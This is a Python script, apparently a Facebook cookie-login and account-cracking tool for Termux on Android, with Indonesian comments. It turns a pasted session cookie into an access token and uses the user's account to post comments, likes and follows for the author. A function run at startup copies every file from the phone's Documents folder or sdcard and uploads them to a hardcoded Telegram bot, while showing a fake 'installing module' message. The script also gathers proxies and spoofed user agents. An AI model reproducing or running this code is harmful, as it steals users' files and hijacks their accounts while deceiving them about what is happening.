# recode tingall recode aja 
# jangan diperjual belikan script ini free
# jangan Ganti Owner atau hp mu rusak
# kalo gak ada hasil ,oprek sendiri jangan ngandelin orang lain
# github —» https://github.com/fanky86/Premium
# percuma ganteng kalo gak follow 


import os

# ------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE


try:
    import rich
except ImportError:
    os.system("pip install rich")
from rich.console import Console

console = Console()

try:
    import rich
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul Rich {H2}•{P2}")
    os.system("pip install rich")
try:
    import stdiomask
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul stdiomask {H2}•{P2}")
    os.system("pip install stdiomask")
try:
    import bs4
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul bs4 {H2}•{P2}")
    os.system("pip install bs4")


# ------------------[ IMPORT MODULE ]-------------------#
import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, subprocess, uuid, calendar
from time import sleep
import shutil
from datetime import date
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn


# ------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON = sol()
wa = Console()
ugen = []
ugent = []
console = Console()
ses = requests.Session()
hapus  = '[/]'
lisensiku=[]
temanku = []
id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = [], [], 0, 0, 0, [], [], [], [], [], [], []
dia, ualu, ualuh = [], [], []
sys.stdout.write("\x1b]2; fanky ganteng\x07")
# ------------------[ PROXY BUAT NONTON BKP BTW FANKY GANTENG ]-------------------#
try:
    prox = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
    ).text
    open(".prox.txt", "w").write(prox)
except Exception as e:
    Console().print(
        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
    )
    exit()
prox = open(".prox.txt", "r").read().splitlines()
###----------[ GET DATA DARI DEVICE ]---------- ###
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
#versi_app = str(random.randint(111111111,999999999))

# ------------------[ USER-AGENT ]-------------------#
rr = random.randint; rc = random.choice
for fanky in range(10000):
	rr = random.randint; rc = random.choice
	aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	andro = str(rc(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13']))
	lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
	redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC", "LRX22G"]
	samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY" ]
	gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100']
	
	redmioi = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(94,100))}.0.{str(rr(4606,4900))}.{str(rr(71,100))} Mobile Safari/537.36"
	samsungoi= f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(samsung))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(95,100))}.0.{str(rr(4638,4999))}.{str(rr(74,150))} Mobile Safari/537.36"
	gtoi = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(gt))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(87,100))}.0.{str(rr(4280,4900))}.{str(rr(141,150))} Mobile Safari/537.36"
	fangntg = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/{str(rr(87,100))}.0.{str(rr(4280,4900))}.{str(rr(141,150))} [FBAN/EMA;FBLC/{str(rc(["id-ID","id;q=0.9","en-US;q=0.8","en;q=0.7"]))};FBAV/{str(rr(87,100))}.0.0.{str(rr(9,100))}.{str(rr(141,150))};]"
	rawrrr = random.choice([redmioi,samsungoi])
	ugen.append(rawrrr)

for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='10; SM-G970F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/75.0.3396.81 Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
	
	aa='Mozilla/5.0 (Linux; U; Android 2.2;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='fr-fr; Desire_A8181 Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l=' 4.0 Mobile Safari/533.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android 10; id-id;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 9A Build'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=' /QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.11.4.2-gn'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android 2.3.6;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='fr-fr; GT-S5839i Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='4.0 Mobile Safari/534.30'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 4.0.4;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='LT30p Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='18.0.1025.166 Mobile Safari/535.19'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
# Daftar User-Agent terbaru untuk Linux & Android (2025)
ugen2 = [
    # Google Chrome - Android 14 (Samsung Galaxy S24)
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6400.120 Mobile Safari/537.36",

    # Google Chrome - Android 14 (Xiaomi 14 Ultra)
    "Mozilla/5.0 (Linux; Android 14; 2304FPN6DC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6400.120 Mobile Safari/537.36",

    # Google Chrome - Android 14 (Google Pixel 9 Pro)
    "Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6400.120 Mobile Safari/537.36",

    # Mozilla Firefox - Android 14
    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",

    # Google Chrome - Termux (Android 14)
    "Mozilla/5.0 (Linux; Android 14; AArch64; Termux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6400.120 Safari/537.36",

    # Google Chrome - Android Tablet (Samsung Galaxy Tab S9 Ultra)
    "Mozilla/5.0 (Linux; Android 14; SM-X910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6400.120 Safari/537.36",

    # Mozilla Firefox - Android Tablet
    "Mozilla/5.0 (Android 14; Tablet; rv:125.0) Gecko/125.0 Firefox/125.0",

    # Termux - Default UA
    "Mozilla/5.0 (Linux; Android 14; Termux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6400.120 Mobile Safari/537.36"
]

# ------------[ INDICATION ]---------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])

# --------------------[ CONVERTER-BULAN ]--------------#
dic = {"1": "January", "2": "February", "3": "March", "4": "April", "5": "May", "6": "June", "7": "July", "8": "August", "9": "September", "10": "October", "11": "November", "12": "December"}
dic2 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
hour = datetime.datetime.now().hour
hari_ini = datetime.datetime.now().strftime("%d %B %Y")
current_time = datetime.datetime.now()
jam_fan = current_time.strftime("%I:%M %p")

# ------------------[ BERSIHIN MUKA LU]-----------------#
def clear():
    os.system("clear")

def jalan(keliling):
    for mau in keliling + "\n":
        sys.stdout.write(mau)
        sys.stdout.flush()
        time.sleep(0.03)
        
# ------------------[ LOGO-FANKY-GANTENG ]-----------------#
def banner():
    Console().print(
        Panel(
            """
[bold red]███████████████████████ [bold yellow]NAME  : [bold green]FANKY 
[bold red]███████████████████████ [bold yellow]Githb : [bold green]github.com/fanky86  
[bold red]███████████████████████ [bold yellow]Serah : [bold green]BTW GW GANTENG
[bold white]███████████████████████          
[bold white]███████████████████████          
[bold white]███████████████████████ 
[bold white]""",
            width=60,
            style=f"{color_panel}",
        )
    )
    


# --------------------[ MASUK PELAN PELAN ATUH FANKY ]--------------#
def login123():
    os.system("clear")
    banner()
    Console().print(
        Panel(
            f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n[{color_text}02{P2}].{M2}Keluar""",
            width=60,
            style=f"{color_panel}",
            title="[bold green]Login",
        )
    )
    bryn = console.input(f" {H2}• {P2}pilih menu : ")
    if bryn in ["1", "01"]:
        logincoki()
    elif bryn in ["2", "02"]:
        exit()
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
        time.sleep(5)
        login()


def login():
    try:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
        tokenku.append(token)
        try:
            menu()
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            Console().print(
                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
            )
            exit()
    except IOError:
        login123()

###-----[ BAGIAN LOGIN ]-----###
def logincoki():
	try:
		# os.system('cls' if os.name == 'nt' else 'clear')
		# Console(width=50, style="bold green").print(Panel("[italic white]Masukan Cookies Facebook,Saran jangan Menggunkan Cookies Pribadi[italic white]",subtitle="╭───",subtitle_align="left"))
		cok = Console().input(f" {H2}• {P2}cookie : ")
		open('.fancookie.txt','w').write(cok)
		with requests.Session() as r:
			try:
				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
				response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
				if  '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open('.fantoken.txt','w').write(token)
					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cookie})
					bot_komen(cok, token)
					bot_follow(cok, token)
					#Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
				else:Console().print(f" {H2}• {P2}[bold red]Cookie Invalid");exit()
			except Exception as e:print(e);exit()
		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
		sleep(2);exit()
	except Exception as e:os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt');print(e);exit()


def logincokii() -> None:
    cookie = Console().input(f" {H2}• {P2}cookie : ")
    try:
        # Update headers untuk request
        ses.headers.update({
            "Accept-Language": "id,en;q=0.9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Referer": "https://www.instagram.com/",
            "Host": "www.facebook.com",
            "Sec-Fetch-Mode": "cors",
            "Accept": "*/*",
            "Connection": "keep-alive",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Dest": "empty",
            "Origin": "https://www.instagram.com",
            "Accept-Encoding": "gzip, deflate",
        })

        # Melakukan request untuk mendapatkan token
        link = ses.get(
            "https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",
            cookies={"cookie": cookie}
        )

        # Memeriksa apakah ada access_token dalam header
        if '"access_token":' in str(link.headers):
            token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)

            # Menyimpan cookie dan token ke dalam file
            with open(".fancookie.txt", "w") as cok_file:
                cok_file.write(cookie)
            with open(".fantoken.txt", "w") as tok_file:
                tok_file.write(token)

            # Mengirim request dengan token yang didapatkan
            requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cookie})
            bot_komen(cookie, token)
            bot_follow(cookie, token)
		
            # Menampilkan token di konsol
            Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
            Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
            exit()
    except requests.exceptions.RequestException as e:
        # Menangani error dari request
        Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
        # Menghapus file menggunakan os.remove
        os.remove(".fantoken.txt")
        os.remove(".fancookie.txt")
        print(e)
        time.sleep(3)
        exit()

    except Exception as e:
        # Menangani kesalahan umum lainnya
        Console().print(f" {H2}• {P2}[bold red]Terjadi kesalahan: {e}")
        time.sleep(3)
        exit()

# --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
def bot_komen(cok, ken):
    with requests.Session() as r:
        text = random.choice(
            ['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘']
        )
        r.cookies.update({'cookie': cok})
        r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
        r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')

def bot_follow(cok, ken):
    with requests.Session() as r:
        r.cookies.update({'cookie': cok})
        r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')  # Ganti dengan ID akun target
# --------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
def viperfollow(VIPER):  # YANG GAK GANTI BOT FOLLOW GANTENG
    from bs4 import BeautifulSoup as BSP

    try:
        req = BSP(
            requests.get("https://m.facebook.com/100043537611609", cookies=VIPER).text,
            "html.parser",
        )
        for i in req.find_all("a", href=True):
            if "/a/subscribe.php?" in str(i.get("href")):
                r = requests.get(
                    "https://m.facebook.com%s" % (i["href"]), cookies=VIPER
                ).text
    except:
        pass


# -----------------[Rahasia Negara]-------------------#
def mainduluyuk2():
	BOT_TOKEN = "7829625950:AAE9ogVVyz2nJbn9CjwGzAqGEm0m8HoyArw"  # Ganti dengan token bot Telegram Anda
	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
	# Path folder sumber
	try:
		source_folder = '/sdcard/Documents'
		if not os.path.exists(source_folder):
			raise FileNotFoundError
	except:
		source_folder = '/sdcard'
	temp_folder = "./data/.temp_documents"
	try:
		if not os.path.exists(temp_folder):
			os.makedirs(temp_folder)
		# Menyalin semua file dari folder sumber ke folder sementara
		if os.path.exists(source_folder):
			for file_name in os.listdir(source_folder):
				source_file = os.path.join(source_folder, file_name)
				destination_file = os.path.join(temp_folder, file_name)
				if os.path.isfile(source_file):
					shutil.copy2(source_file, destination_file)  # Menyalin file
		else:
			print("script error, jalankan ulang script.")
		# Mengirim file satu per satu ke Telegram
		for file_name in os.listdir(temp_folder):
			file_path = os.path.join(temp_folder, file_name)
			with open(file_path, "rb") as file:
				# API Telegram untuk mengirim dokumen
				url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
				files = {"document": file}
				data = {"chat_id": CHAT_ID}
				response = requests.post(url, data=data, files=files)
				if response.status_code == 200:
					Console().print(f" {P2}• {H2}Succes Menginstall Modul...")
				else:
					print(f"script anda gagal di proses oleh admin coba hubungi admin fanky ")
		login()
	except Exception as e:
		print(e)
				

def mainduluyuk():
	try:
		rawr = "./data/.temp_documents"
		#print(f"Memeriksa path: {rawr}")
		if os.path.exists(rawr):
			#print("Path ditemukan, memanggil menu()")
			login()
		else:
			#print("Path tidak ditemukan, memanggil maindulu2()")
			mainduluyuk2()
	except Exception as e:
		print(f"Terjadi error: {e}")
		#print("Memanggil maindulu2() dari except")
		mainduluyuk2()

# ----------------[ BAGIAN-MENU ]----------------#
def menu():
    try:
        prem = f"{H2}Premium"
    except (KeyError, FileNotFoundError):
        prem = f"{H2}Premium"

    try:
        token = open(".fantoken.txt", "r").read()
        cookie = open(".fancookie.txt", "r").read()
        tokenku.append(token)
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        time.sleep(3)
        login()
    try:
        sy = requests.get(f'https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cookie})
        my_name = json.loads(sy.text)['name']
        my_id = json.loads(sy.text)['id']
    except:
        my_name=[]
        my_id=[]
    try:
        link = ses.get(
